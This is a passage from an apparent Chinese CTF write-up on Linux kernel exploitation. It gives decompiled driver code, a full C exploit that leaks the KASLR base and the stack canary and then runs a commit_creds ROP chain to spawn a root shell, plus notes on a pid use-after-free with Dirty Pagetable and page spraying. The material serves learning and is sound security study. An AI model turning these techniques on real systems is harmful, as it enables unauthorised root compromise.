class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">device_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  _QWORD v6[<span class="number">36</span>]; <span class="comment">// [rsp-120h] [rbp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v6[<span class="number">35</span>] = v2;</span><br><span class="line">  v6[<span class="number">33</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x1337</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  v4 = v3;</span><br><span class="line">  copy_from_user(v6);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)copy_to_user(v4 + <span class="number">8</span>, v6[<span class="number">0</span>], <span class="number">256LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">device_write</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  _QWORD v4[<span class="number">10</span>]; <span class="comment">// [rsp-50h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v4[<span class="number">9</span>] = v2;</span><br><span class="line">  v4[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  copy_from_user(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida识别有点问题</p><p>总之ioctl存在一个任意读,然后write存在栈溢出</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>有以上这两个漏洞点了,思路就明确了</p><p>那么首先肯定要通过任意读读来泄露地址和canary</p><p>但是怎么搞呢,直接读取出来的肯定不会包含有我们需要的信息</p><p>不过我们可以利用一个特性,在不考虑<code>harden_usercopy</code>的情况下,copy_to_user的返回值是未成功copy的数量,我们可以以此来判断是否命中</p><p>以上是暴力搜索,不过我们还可以通过cpu_entry_area mapping来获得基址</p><p>那么如何泄露canary,栈上的显然没法泄露出来,不过</p><blockquote><p>该题开启了内核栈canary保护，因此需要泄漏 在用户空间中，进程canary保存在tls结构体中，由fs寄存器指向，通过fs+0x28访问canary，并且低8位全都为0 而在内核空间中，进程canary保存在进程的task_struct中，且低8位同样也全都为0 而通过任意地址读取，可以通过遍历struct task_struct来泄漏自身进程的canary</p></blockquote><p>内核态下canary位于task_struct中,那如何获得task_struct,一种自然还是暴力搜索</p><p>另一种嘛,在泄露了<code>.text</code>的前提下,如果导出了<code>init_task</code>符号,所有的task_struct是通过双向链表连接的,只要通过这个链表就能得到当前进程的task_struct</p><blockquote><p>对于init_task对应的pid 0进程而言，pid和t_pid均为0，stack_canary为低八位为0其他位不为0的8字节数，comm通常为”swapper/0″</p></blockquote><p>但现在还有一个问题,不同版本task_struct之间存在差异,若是有符号表自然能够直接显示出来,但大多数时候题目只给我们一个bzimage,这时候就需要通过特殊标志来定位目标数据了,这样不一定准确,但也没有更好的办法了</p><blockquote><p>特别要注意到，struct list_head children中的next指针指向的是下一个task_struct中children成员 + 0x10，而非task_struct头部或list_head的next指针</p></blockquote><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fuse.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"><span class="type">char</span> content[<span class="number">0x180</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> kernel_base, init_task, prepare_kernel_cred, commit_creds, kpti_trampoline, pop_rdi, cred, canary;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs,user_ss,user_eflag,rsp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq;&quot;</span></span><br><span class="line"><span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">: <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_eflag),<span class="string">&quot;=r&quot;</span>(rsp)</span><br><span class="line">:</span><br><span class="line">: <span class="string">&quot;memory&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dev_read</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> <span class="title">request_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;<span class="type">request_t</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request));</span><br><span class="line"><span class="type">request_t</span>.ptr = ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = ioctl(dev_fd, <span class="number">0x1337</span>, &amp;<span class="type">request_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(data, <span class="type">request_t</span>.content, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dev_write</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> write(dev_fd, data, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">save_state();</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;bkfish&quot;</span>);</span><br><span class="line"></span><br><span class="line">dev_fd = open(<span class="string">&quot;/dev/window&quot;</span>,O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *data = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(<span class="number">0xfffffe0000000004</span>), data);</span><br><span class="line"></span><br><span class="line">kernel_base = *(<span class="type">uint64_t</span> *)data - <span class="number">0x1008e00</span>;</span><br><span class="line">init_task = kernel_base + <span class="number">0x201b600</span>;</span><br><span class="line">prepare_kernel_cred = kernel_base + <span class="number">0xffb80</span>;</span><br><span class="line">commit_creds = kernel_base + <span class="number">0xff8a0</span>;</span><br><span class="line">kpti_trampoline = kernel_base + <span class="number">0x10010f0</span> + <span class="number">22</span> + <span class="number">0x20</span>;</span><br><span class="line">pop_rdi = kernel_base + <span class="number">0x1d675</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_base = 0x%llx\n&quot;</span>, kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] init_task = 0x%llx\n&quot;</span>, init_task);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred = 0x%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] commit_creds = 0x%llx\n&quot;</span>, commit_creds);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kpti_trampoline = 0x%llx\n&quot;</span>, kpti_trampoline);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> task_struct = init_task + <span class="number">0x9f0</span>;</span><br><span class="line"><span class="type">char</span> comm[<span class="number">0x10</span>];</span><br><span class="line"><span class="keyword">for</span> ( ; ; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">memset</span>(comm, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(task_struct + <span class="number">0x1a8</span>), data);</span><br><span class="line"><span class="built_in">strncpy</span>(comm, data, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, <span class="string">&quot;bkfish&quot;</span>, <span class="number">0x6</span>))</span><br><span class="line">&#123;</span><br><span class="line">dev_read((<span class="type">void</span> *)(task_struct - <span class="number">0x28</span>), data);</span><br><span class="line">canary = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(task_struct - <span class="number">0x10</span>), data);</span><br><span class="line">task_struct = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] canary = 0x%llx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">dev_read((<span class="type">void</span> *)(init_task + <span class="number">0x9f0</span> + <span class="number">0x198</span>), data);</span><br><span class="line">cred = *(<span class="type">uint64_t</span> *)data;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] cred = 0x%llx\n&quot;</span>, cred);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0x8</span>;</span><br><span class="line">ROP[cnt++] = canary;</span><br><span class="line">ROP[cnt++] = <span class="number">0</span>;</span><br><span class="line">ROP[cnt++] = pop_rdi;</span><br><span class="line">ROP[cnt++] = cred;</span><br><span class="line">ROP[cnt++] = commit_creds;</span><br><span class="line">ROP[cnt++] = kpti_trampoline;</span><br><span class="line">ROP[cnt++] = <span class="number">0</span>;</span><br><span class="line">ROP[cnt++] = <span class="number">0</span>;</span><br><span class="line">ROP[cnt++] = (<span class="type">uint64_t</span>)get_shell;</span><br><span class="line">ROP[cnt++] = user_cs;</span><br><span class="line">ROP[cnt++] = user_eflag;</span><br><span class="line">ROP[cnt++] = rsp;</span><br><span class="line">ROP[cnt++] = user_ss;</span><br><span class="line"></span><br><span class="line">dev_write(ROP, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="l3hctf-kpid"><a href="#l3hctf-kpid" class="headerlink" title="l3hctf-kpid"></a>l3hctf-kpid</h2><p>惯例,常规保护还是拉满的</p><p>注册了ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kpid_act_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5[<span class="number">18</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">16</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">430083</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dest_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      --dest_cnt;</span><br><span class="line">      put_pid(pid);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">360450</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">290817</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">-22LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( fork_cnt )</span><br><span class="line">      &#123;</span><br><span class="line">        v5[<span class="number">4</span>] = <span class="number">17LL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v5[<span class="number">5</span>], <span class="number">0</span>, <span class="number">88</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        nr = kernel_clone(v5);</span><br><span class="line">        pid = find_vpid((<span class="type">unsigned</span> <span class="type">int</span>)nr);</span><br><span class="line">        <span class="keyword">if</span> ( pid )</span><br><span class="line">        &#123;</span><br><span class="line">          --fork_cnt;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(&amp;unk_276);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( show_cnt )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(a3, &amp;nr, <span class="number">4LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_259);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --show_cnt;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提供了三个各只能使用一次的功能</p><p>kernel_clone就相当于是一个fork函数</p><p>漏洞出在<strong>0x69003</strong>功能中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dest_cnt )</span><br><span class="line">&#123;</span><br><span class="line">  --dest_cnt;</span><br><span class="line">  put_pid(pid);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>释放了pid但是没有释放该进程</p><p>题目给出提示：Dirty Pagetable</p><p>Dirty PageTable 是一种针对堆相关漏洞的利用手法，主要就是针对 PTE 进行攻击</p><p>在 x86-64 Linux 中，通常使用 4 级页表将虚拟地址转换为物理地址</p><ul><li>Dirty Pagetable 以 PTE（页表条目）为目标，这是物理内存之前的最后一个级别</li><li>在 Linux 中，当需要新的 PTE 时，PTE 的页面也会使用 Buddy 系统进行分配</li></ul><p>victim pid 对象的计数字段与有效的 PTE 重合</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">refcount_t</span> count; <span class="comment">/* 指向该数据结构的引用次数 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> level;</span><br><span class="line"><span class="type">spinlock_t</span> lock;</span><br><span class="line"><span class="comment">/* lists of tasks that use this pid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">tasks</span>[<span class="title">PIDTYPE_MAX</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">inodes</span>;</span></span><br><span class="line"><span class="comment">/* wait queue for pidfd notifications */</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> wait_pidfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">upid</span> <span class="title">numbers</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>count 字段是 pid 对象的第一个字段（8 字节对齐），尽管 count 字段大小为 4 个字节，但它恰好与 PTE 的较低 4 字节重合，因此我们可以通过计数器来修改 PTE</li><li>由于进程中的 fd 资源有限，它最多只能添加 32768 进行计数，为了打破这个限制，我们可以利用 fork 在多个进程中执行增量原语，此操作允许我们向受害者 PTE 添加足够大的数字</li></ul><p>我们可以通过 mmap 来快速分配大量页表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *page_spray[N_PAGESPRAY];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">    page_spray[i] = mmap((<span class="type">void</span>*)(<span class="number">0xdead0000</span>UL + i*<span class="number">0x10000</span>UL),</span><br><span class="line">                         <span class="number">0x8000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                         MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page_spray[i] == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; N_PAGESPRAY; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br></pre></td></tr></table></figure><ul><li>Linux 内核是惰性的，当 mmap 创建内存时并不会为其绑定页表，只有在第一次读写时才会通过缺页处理来进行绑定</li></ul><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="kaslr的随机化范围"><a href="#kaslr的随机化范围" class="headerlink" title="kaslr的随机化范围"></a>kaslr的随机化范围</h2><p>在qemu模拟中这个选项是默认打开的</p><p>kaslr在kernel text部分随机化范围是9位</p><p>其在不开启kaslr的情况下,默认是在<code>0xffffffff81000000</code>(虽然官方文档是<code>0xffffffff80000000</code>)</p><p>在开启kaslr后其随机化的9位,还不是很清楚到底是哪几位,不过在多次调试后大致可以判断</p><p>是<code>810</code>即<code>1000 0001 0000</code>这12位中的前两位中四位后三位</p><p>所以kaslr的范围是<code>FFFF FFFF 8100 0000--FFFF FFFF BFE0 0000</code></p><p>这是一个可接受的范围,爆破一下也不是不行</p><p>至于内核其他部分不确定,也没有去调试,不过大致判断也差不多</p><h2 id="slab分配最小大小"><a href="#slab分配最小大小" class="headerlink" title="slab分配最小大小"></a>slab分配最小大小</h2><p>在<code>include/linux/slab.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc array related definitions</span></span><br><span 